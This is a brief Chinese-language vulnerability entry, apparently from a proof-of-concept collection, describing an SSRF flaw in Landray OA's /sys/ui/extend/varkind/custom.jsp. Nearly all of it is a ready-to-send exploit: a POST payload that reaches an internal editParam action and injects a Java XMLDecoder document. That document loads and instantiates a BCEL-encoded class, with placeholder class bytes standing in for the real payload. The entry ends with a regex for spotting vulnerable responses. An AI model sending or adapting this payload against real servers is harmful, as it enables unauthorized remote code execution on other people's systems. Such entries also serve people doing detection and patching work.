# 蓝凌OAcustom.jsp存在SSRF漏洞

蓝凌 ｜ SSRF ｜ —
- **请求**：`POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1`

**Payload**
```
var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void+class%3d"com.sun.org.apache.bcel.internal.util.ClassLoader"><void+method%3d"loadClass"><string>$$BCEL$$1234</string><void+method%3d"newInstance"></void></void></void></java>
```
- **响应特征**：-1 ^(?=.*?您的请求已提交)(?=.*?icon).*?$